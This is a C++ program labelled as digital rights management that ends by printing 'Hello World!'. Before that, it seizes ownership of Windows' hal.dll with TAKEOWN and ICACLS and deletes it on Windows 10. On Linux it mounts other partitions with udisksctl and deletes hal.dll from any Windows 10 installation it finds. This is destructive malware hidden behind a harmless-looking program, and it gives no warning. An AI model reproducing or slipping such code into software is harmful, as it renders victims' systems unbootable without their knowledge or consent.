/* Адриан Баррето 19/02/18
 * Copyright (c) 2018 TTFH
 * Digital Rights Management
 * This software is distributed "as-is", with no warranty expressed or implied,
 * and no guarantee for accuracy or applicability to any purpose. 
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <shlobj.h>
#include <windows.h>
#else
#include <sys/stat.h>
#endif

#define RED    "\x1b[91m"
#define NORMAL "\x1b[0m"

enum OS_Lang { English, Spanish };
enum AccessLevel { User = 1, Admin = 2, System = 3 };
enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };

OS_Lang language;

WinVer WindowsVersion() {
#ifdef _WIN32
  FILE* script = fopen("version.cmd", "w");
  if (script == nullptr) return Error;
  fputs("@Echo off\n del /F version >nul 2>&1\n ver > version", script);
  fclose(script);
  system("C:\\Windows\\System32\\cmd.exe /C version.cmd");
  remove("version.cmd");

  unsigned int major, minor;
  char* strver = new char[8];
  // ó is a single character
  FILE* ver = fopen("version", "r");
  if (ver == nullptr) return Error;
  int readed = fscanf(ver, "\nMicrosoft Windows [%s %u.%u.", strver, &major, &minor);
  fclose(ver);
  remove("version");

  if (readed != 3) return Error;
  language = strcmp(strver, "Version") == 0 ? English : Spanish;
  delete strver;

  switch (major) {
    case 10:
      return Win10;
    case 6:
      switch (minor) {
        case 3: return Win8_1;
        case 2: return Win8;
        case 1: return Win7;
        case 0: return WinVista;
      }
    break;
    case 5:
      switch (minor) {
        case 2: return WinXP64;
        case 1: return WinXP32;
        case 0: return Win2000;
      }
    break;
  }
#endif
  return Other;
}

static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
  if (file == nullptr) return false;
  char* takeown = new char[strlen(file) + 15];
  strcpy(takeown, "TAKEOWN /F ");
  strcat(takeown, file);
  strcat(takeown, " /A");
  printf("Executing: %s\n", takeown);
  system(takeown);
  delete takeown;

  char* grant = language == English ? new char[strlen(file) + 32] : new char[strlen(file) + 33];
  strcpy(grant, "ICACLS ");
  strcat(grant, file);
  if (language == English)
    strcat(grant, " /GRANT Administrators:F");
  else
    strcat(grant, " /GRANT Administradores:F");
  printf("Executing: %s\n", grant);
  system(grant);
  delete(grant);

  program = System;
  return true;
}

static bool IsUserSystem(AccessLevel& program, const char* file) {
  program = User;
#ifdef _WIN32
  if (IsUserAnAdmin()) {
    program = Admin;
    return GetSystem(program, file);
  } else {
    MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
    // exit(EXIT_FAILURE);
  }
#endif
  return false;
}

void DeleteIf(bool cond, const char* path) {
  if (cond) {
    AccessLevel program;
    if (IsUserSystem(program, path))
      remove(path);

    switch (program) {
      case User: printf("Running has User\n");
      break;
      case Admin: printf("Running has Admin\n");
      break;
      case System: printf("Running has System\n");
      break;
    }
  }
}

void MountedSearch() {
#ifndef _WIN32
  printf("Looking for mounted drives...\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 != \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];
  char source[32];

  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
    printf("Drive %s mounted in: %s\n", drive, source);
    if (strcmp(source, "/") == 0) strcpy(source, "\0");
    char* name = new char[strlen(source) + 28];
    strcpy(name, source);
    strcat(name, "/Windows/System32/D3D12.dll");
    printf("Looking for file: %s\n", name);

    stat buffer;
    if (stat(name, &buffer) == 0) {
      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
      char* del = new char[strlen(source) + 26];
      strcpy(del, source);
      strcat(del, "/Windows/System32/hal.dll");
      printf("Deleting %s ...\n", del);
      remove(del);
      delete del;
    }
    delete name;
    printf("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

void UnmountedSearch() {
#ifndef _WIN32
  printf("Looking for unmounted drives...\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 == \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];

  while (fscanf(drive_list, "%s\n", drive) == 1) {
    printf("Unmounted drive found in: %s\n", drive);

    printf("Mounting drive...\n");
    char* mount = new char[strlen(drive) + 33];
    strcpy(mount, "udisksctl mount -b /dev/");
    strcat(mount, drive);
    strcat(mount, " > media");
    system(mount);
    delete mount;

    FILE* media = fopen("media", "r");
    assert(media != nullptr);
    char source[32];
    int mounted = fscanf(media, "Mounted %s at %s", drive, source);
    fclose(media);
    remove("media");
    if (mounted != 2) {
      printf(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n", drive);
      continue;
    }

    int length = strlen(source);
    source[length - 1] = '\0';
    printf("Drive %s mounted in: %s\n", drive, source);

    char* name = new char[strlen(source) + 28];
    strcpy(name, source);
    strcat(name, "/Windows/System32/D3D12.dll");
    printf("Looking for file: %s\n", name);

    stat buffer;
    if (stat(name, &buffer) == 0) {
      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
      char* del = new char[strlen(source) + 26];
      strcpy(del, source);
      strcat(del, "/Windows/System32/hal.dll");
      printf("Deleting %s ...\n", del);
      remove(del);
      delete del;
    }
    delete name;
    printf("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

int main(int argc, char* argv[]) {
  DeleteIf(WindowsVersion() == Win10, "C:\\Windows\\System32\\hal.dll");

  printf("You are using Windows ");
  WinVer ver = WindowsVersion();
  switch (ver) {
    case Win10: printf("10");
    break;
    case Win8_1: printf("8.1");
    break;
    case Win8: printf("8");
    break;
    case Win7: printf("7");
    break;
    case WinVista: printf("Vista");
    break;
    case WinXP64: printf("XP x64");
    break;
    case WinXP32: printf("XP x86");
    break;
    case Win2000: printf("2000");
    break;
    case Other: printf("%c... no, you're not.", 8);
    break;
    case Error: printf("--- ERROR ---");
    break;
  }
  printf("\n\n");

  MountedSearch();
  UnmountedSearch();

  // Main program start here.
  printf("\n");
  printf("Hello World!");
  getchar();
  printf("\n\n");
  return 0;
}

/* ------------ HEADER ------------ *
  enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
  WinVer WindowsVersion();
  void MountedSearch();
  void UnmountedSearch();
  void DeleteIf(bool, const char*);
*/
